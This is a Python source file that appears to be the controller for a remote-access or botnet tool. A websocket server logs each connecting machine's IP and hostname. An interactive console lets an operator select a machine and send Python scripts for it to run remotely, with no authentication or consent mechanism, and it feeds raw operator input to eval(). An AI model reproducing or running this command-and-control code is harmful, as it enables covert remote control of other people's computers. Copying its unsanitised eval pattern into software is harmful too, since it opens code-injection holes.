import asyncio
import websockets
import threading
import queue
import glob
import json
import time
import sys
import os


SOCKETS = []


async def handle_conn(websocket, path):
    data = json.loads(await websocket.recv())
    sys_info = data.copy()
    sys_info["id"] = len(SOCKETS)
    sys_info["alive"] = True
    sys_info["ip"] = websocket.remote_address[0]
    nick = "{}/{}/{}".format(sys_info["ip"], sys_info["hostname"], sys_info["id"])
    sys_info["nick"] = nick
    system = (websocket, sys_info)
    SOCKETS.append(system)
    try:
        async for message in websocket:
            try:
                msg = json.loads(message)
                if msg.get("result"):
                    result = msg["result"]
                    print(f"\n[{nick}] {result}\n")
                if msg.get("error"):
                    error = msg["error"]
                    print(f"\n[{nick}] {error}\n")
            except Exception as e:
                print(e)
    except:
        system[1]["alive"] = False


def start_server_async():
    queue

    def _start():
        asyncio.set_event_loop(asyncio.new_event_loop())
        start_server = websockets.serve(handle_conn, "localhost", 8765)
        asyncio.get_event_loop().run_until_complete(start_server)
        asyncio.get_event_loop().run_forever()

    thread = threading.Thread(target=_start)
    thread.start()


def _parse_cmd(cmd):
    if "(" in cmd and ")" in cmd:
        args_idx = cmd.index("(")
        method = cmd[:args_idx]
        args = eval(cmd[args_idx:])
        if type(args) != tuple:
            args = (args,)
    elif " " in cmd:
        cmd_split = cmd.split(" ")
        method = cmd_split[0]
        args = (eval(cmd_split[1]),)
    else:
        method = cmd
        args = tuple()
    return method, args


def create_script_payload(script_name):
    script_fn = os.path.join("scripts", script_name + ".py")
    with open(script_fn, "r") as f:
        script = f.read()
    init_method = f"main_{script_name}_{time.time()}".replace(".", "")
    script = script.replace("def main(", f"def {init_method}(")
    return init_method, script


def send_async(socket, data):
    async def _send():
        await socket.send(data)

    asyncio.get_event_loop().run_until_complete(_send())


def handle_cmd(sys_idx, method, params):
    if method == "exit":
        sys.exit(0)
    elif method in ["list", "ls"]:
        for i, (_, sys_info) in enumerate(SOCKETS):
            if sys_info["alive"]:
                print(i, sys_info["nick"])
    elif method in ["interact", "i"]:
        if len(params) == 0 or params[0] < 0 or params[0] >= len(SOCKETS):
            sys_idx = -1
        else:
            sys_idx = params[0]
    elif method == "scripts":
        for fn in glob.iglob("scripts/*.py"):
            script_name = os.path.basename(fn)[:-3]
            print(script_name)
    elif method == "info":
        print(SOCKETS[sys_idx][1])
    elif sys_idx != -1:
        init_method, script = create_script_payload(method)
        send_async(SOCKETS[sys_idx][0], json.dumps({"script": script, "init_method": init_method, "args": params}))
    return sys_idx


def run_interactive():
    sys_idx = -1
    while True:
        prompt = " > "
        if sys_idx != -1:
            nick = SOCKETS[sys_idx][1]["nick"]
            prompt = f"[{nick}] >> "
        cmd = input(prompt)
        if cmd.strip() == "":
            continue
        try:
            method, params = _parse_cmd(cmd)
            sys_idx = handle_cmd(sys_idx, method, params)
        except Exception as e:
            print(e)
            continue


if __name__ == "__main__":
    start_server_async()
    run_interactive()
